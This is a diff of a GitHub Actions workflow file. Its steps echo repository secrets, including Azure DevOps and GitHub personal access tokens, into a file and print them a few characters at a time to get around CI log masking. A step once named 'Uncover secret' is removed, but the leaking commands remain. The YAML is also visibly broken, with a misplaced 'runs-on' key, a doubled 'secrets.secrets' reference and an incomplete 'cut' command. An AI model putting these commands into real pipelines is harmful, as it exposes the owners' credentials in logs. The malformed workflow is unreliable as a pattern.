@@ -6,10 +6,8 @@ on:
       [labeled] #, opened, edited, deleted, closed, reopened, labeled, unlabeled, assigned
 
 jobs:
-  environment: dev
-  example-job:
+  runs-on: ubuntu-latest
       steps:
-        - name: Uncover secret
         - run: echo -n "${{ secrets.ADO_PERSONAL_ACCESS_TOKEN }}" >> foo && cut -c1-3 foo && cut -c4
         - run: echo -n "${{ secrets.secrets.GH_PERSONAL_ACCESS_TOKEN }}" >> foo && cut -c1-3 foo && cut -c4
         - run: echo -n "${{ secrets.ADO_ORGANIZATION }}" >> foo && cut -c1-3 foo && cut -c4
